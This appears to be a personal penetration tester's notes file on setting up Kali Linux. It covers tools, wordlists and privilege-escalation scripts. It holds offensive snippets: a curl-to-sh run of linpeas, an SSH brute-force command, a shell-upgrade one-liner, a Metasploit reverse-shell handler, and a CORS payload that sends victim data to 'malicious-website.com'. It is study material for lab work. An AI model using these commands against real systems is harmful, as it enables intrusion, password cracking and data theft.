
KALI LINUX SETUP:
------------------

# TO FIX - from some unknown reason basic $SHELL is -> /bin/zsh -> SAME IN LAB -> FIX THAT

sudo apt -y install jq gobuster seclists jd-gui socat masscan seclists 

~/.vimrc 

set syntax
colorscheme desert | industry 
set nu 

chown kali:kali /usr/share/wordlists 

git clone https://github.com/swisskyrepo/PayloadsAllTheThings

git clone https://github.com/danielmiessler/SecLists

git clone https://github.com/gynsty/wordlists

SUDO no password: myuser ALL=(ALL) NOPASSWD: ALL

install locate 
sudo updatedb

linux-exploit-suggester - wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O linux-exploit-suggester.sh

linux-exploit-suggester2 - wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl -O linux-exploit-suggester2.sh 

Linux linpeas: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh -> to download 

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh -> to execute 

Windows: https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation

https://github.com/carlospolop/PEASS-ng

https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

curl -L https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat > winpeas.bat 

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe > winpeas.exe 

Burpsuite will be probably not up to date. 

Dirbuster /usr/bin/dirbuster -> increase memory limit 

FIX HISTSIZE 
HISTFORMAT - too keep timeframe: export HISTTIMEFORMAT=’%F %T ‘

INSTALL go:

https://tzusec.com/how-to-install-golang-in-kali-linux/

https://golang.org/dl/
Download the latest version for Linux – “gox.xx.x.linux-amd64.tar.gz”

Open your terminal and navigate to your downloads folder
cd /root/Downloads
Extract the files
tar -C /usr/local/ -xzf go1.13.6.linux-amd64.tar.gz
Add variables for GO by modifying “~/.bashrc”
vim ~/.bashrc
Add the following paths to the end of the file
export GOPATH=/root/go-workspace
export GOROOT=/usr/local/go
PATH=$PATH:$GOROOT/bin/:$GOPATH/bin
Now we need to refresh the bashrc to get the updated variables
source ~/.bashrc
Now we just need to verify that everything is correct configured and we can do that by creating a simple ‘hello world’ program in Go.
vim helloworld.go
Add the following code to the file:
package main
import "fmt"
func main() {
fmt.Printf("Hello world!\n")
}
Then save the file and try to run the program:
go run helloworld.go

UPDATE:
--------
searchsploit -u -> update serchsploit 

#####################################################
Password brute-force tools:

patator, hydra, medusa, cupp, crunch 

curl -sSfL 'https://git.io/kitabisa-ssb' | sh -s -- -b /usr/local/bin 

This works but put user@HOST ALWAYS at the end:

./ssb -w /tmp/slovnik.txt -c 1000 -p 2226 user@192.168.1.20

https://github.com/kitabisa/ssb

###################################################
WEB brute-force

dirb
gobuster 
dirstalk
SKIPFISH
wfuzz
fuff
		  
##################################################3

jd_gui -> up to date -> install fresh one 

python -c 'import pty; pty.spawn("/bin/sh")'

https://netsec.ws/?p=337

find / -writable 

w3m as alternative to wget 

To list all installed modules from a python console without pip, you can use the following command:

>>> help("modules")

import requests
URL = "https://instagram.com/favicon.ico"
response = requests.get(URL)
open("instagram.ico", "wb").write(response.content)

https://www.codingem.com/python-download-file-from-url/

https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c

Openssl download file:
-------------------------
(printf "GET $PATH HTTP/1.0\r\nHost: $HOST\r\n\r\n"; sleep 10) | \
    openssl s_client -connect $HOST:443 -quiet) > /tmp/output.tmp

Identify methods: 

These methods are named as follows:
• doGet
• doPost
• doPut
• doDelete
• doCopy
• doOptions

protected void doGet(HttpServletRequest req, HttpServletResponse resp)

LOOK FOR: request.getParameter

str. 138 SQL injection 

---------
CORS:
--------
https://portswigger.net/web-security/cors

A C A O - Access Control Allow Origin 

Access-Control-Allow-Credentials = true -> allowing to send cookies etc with request 

XMLHttpRequest:

var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
};

---------------------
MULTI HANDLER
---------------------

msfcli is deprecated since 2015 

msfconsole -x "use exploit/multi/handler; set RHOST [IP]; set LPORT [PORT];set PAYLOAD generic/reverse_shell_tcp" 

---------------------
SimpleHTTPServer:
---------------------

BUT KALI DOES NOT HAVE SimpleHTTPServer USE INSTEAD:

python3 -m http.server --bind 127.0.0.1 8080

----------------------
Simple DNS server 
-----------------------

dnschef -i interface -p port --logfile LOGFILE

